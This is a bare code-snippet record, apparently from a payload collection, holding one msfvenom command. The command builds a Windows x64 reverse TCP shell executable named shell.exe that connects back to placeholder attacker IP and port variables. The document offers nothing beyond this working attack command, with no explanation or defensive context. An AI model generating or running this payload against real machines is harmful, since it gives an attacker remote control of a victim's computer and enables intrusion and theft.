---
id: 7af6e619-ad6a-4d80-b890-6dd5525f487a
type: code
language: Payload
verified: false
created_at: '2020-03-17T03:03:22.259947+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 7af6e619

**Language**: Payload

```payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f exe -o shell.exe
```


